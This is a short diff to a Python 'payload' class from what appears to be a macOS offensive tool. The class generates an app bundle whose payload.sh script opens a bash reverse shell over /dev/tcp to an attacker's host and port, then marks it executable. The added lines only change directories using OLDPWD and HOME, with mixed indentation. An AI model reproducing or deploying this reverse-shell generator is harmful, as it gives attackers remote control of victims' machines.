@@ -39,6 +39,8 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		w = os.environ['OLDPWD']
+                os.chdir(w)
 		if os.path.isdir(path):
 		    if os.path.exists(path):
 			if path[:-1] == "/":
@@ -70,3 +72,5 @@ class payload:
 		f.close()
 		h.info_success("Saved to " + path + "!")
 		os.system("chmod +x "+path+"/Contents/MacOS/payload.sh")
+		g = os.environ['HOME']
+                os.chdir(g + "/mouse")
